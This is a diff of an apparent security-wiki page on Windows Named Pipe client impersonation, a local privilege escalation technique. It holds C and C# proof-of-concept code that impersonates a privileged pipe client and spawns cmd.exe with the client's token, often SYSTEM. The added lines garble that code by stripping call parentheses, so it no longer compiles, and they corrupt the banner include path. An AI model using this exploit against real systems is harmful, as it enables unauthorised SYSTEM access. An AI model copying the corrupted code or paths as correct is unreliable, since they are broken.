@@ -1,6 +1,6 @@
 # Named Pipe Client Impersonation
 
-{{#include ../../banners/hacktricks-training.md}}
+{{#include ../../banners/this collection-training.md}}
 
 Named Pipe client impersonation is a local privilege escalation primitive that lets a named-pipe server thread adopt the security context of a client that connects to it. In practice, an attacker who can run code with SeImpersonatePrivilege can coerce a privileged client (e.g., a SYSTEM service) to connect to an attacker-controlled pipe, call ImpersonateNamedPipeClient, duplicate the resulting token into a primary token, and spawn a process as the client (often NT AUTHORITY\SYSTEM).<sup>[[2]](#references)</sup>
 
@@ -51,7 +51,7 @@ int main(void) {
 
     // Extract and duplicate the impersonation token into a primary token
     HANDLE impTok = NULL, priTok = NULL;
-    if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
+    if (!OpenThreadToken(GetCurrentThread, TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
     if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;
 
     // Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
@@ -64,7 +64,7 @@ int main(void) {
                              NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
     }
 
-    RevertToSelf(); // Restore original context
+    RevertToSelf; // Restore original context
     return 0;
 }
 ```
@@ -80,12 +80,12 @@ class P {
   [DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
   [DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
   [DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
-  static void Main(){
+  static void Main{
     using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
-    s.WaitForConnection();
+    s.WaitForConnection;
     // Ensure client sent something so the token is available
-    s.RunAsClient(() => {
-      IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
+    s.RunAsClient( => {
+      IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess.Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
       IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
       var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
       Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
@@ -190,4 +190,4 @@ client.write(b"OP\x00\x01...")
 - [7] [Synacktiv: Hooking Windows Named Pipes](https://www.synacktiv.com/en/publications/hooking-windows-named-pipes.html)
 - [8] [Synacktiv: thats_no_pipe](https://github.com/synacktiv/thats_no_pipe)
 
-{{#include ../../banners/hacktricks-training.md}}
+{{#include ../../banners/this collection-training.md}}
